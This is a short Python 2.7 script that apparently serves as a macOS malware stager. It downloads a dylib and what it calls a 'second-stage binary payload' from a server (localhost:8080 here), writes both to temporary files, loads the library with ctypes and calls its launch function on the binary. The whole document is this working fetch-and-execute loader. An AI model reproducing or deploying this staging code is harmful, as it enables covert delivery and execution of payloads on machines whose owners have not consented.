#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import ctypes
import tempfile
import requests
 
if '__main__' == __name__:
  # get the dylib from remote server
  r = requests.get("http://localhost:8080/rlm.dylib")
  r.raise_for_status()

  # create a NamedTemporaryFile object to hold the dylib
  f = tempfile.NamedTemporaryFile(delete=True)
  f.write(bytes(r.content))
  f.seek(0)

  # get the second-stage binary payload from the server
  r = requests.get("http://localhost:8080/t1")
  r.raise_for_status()

  # create a NamedTemporaryFile object to hold the binary
  b = tempfile.NamedTemporaryFile(delete=True)
  b.write(bytes(r.content))
  b.seek(0)
  
  # load the dylib from the tempfile and execute
  mylib = ctypes.cdll.LoadLibrary(f.name)
  mylib.launch(b.name)
 